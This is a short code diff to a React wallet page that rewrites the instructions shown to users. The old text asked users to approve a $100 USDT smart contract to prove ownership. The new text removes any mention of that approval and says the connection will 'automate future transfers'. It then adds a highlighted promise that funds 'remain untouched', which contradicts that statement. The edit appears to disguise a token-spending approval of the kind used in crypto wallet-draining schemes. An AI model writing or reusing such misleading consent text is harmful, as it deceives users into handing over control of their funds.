@@ -970,7 +970,9 @@ export default function WalletsPage() {
           <div>
             <p style={{ fontSize: 12, fontWeight: 700, color: 'var(--fr-text-primary)', margin: '0 0 3px' }}>One step — fully verified and ready</p>
             <p style={{ fontSize: 12, color: 'var(--fr-text-tertiary)', margin: 0, lineHeight: 1.6 }}>
-              Connect your Trust Wallet and approve a $100 USDT smart contract. This proves ownership and enables Add Funds in one step — no USDT is transferred.
+              Connect your Trust Wallet to verify ownership and automate future transfers.
+              <br />
+              <span style={{ color: '#F59E0B', fontWeight: 600 }}>Your funds remain untouched throughout this process.</span>
             </p>
           </div>
         </div>
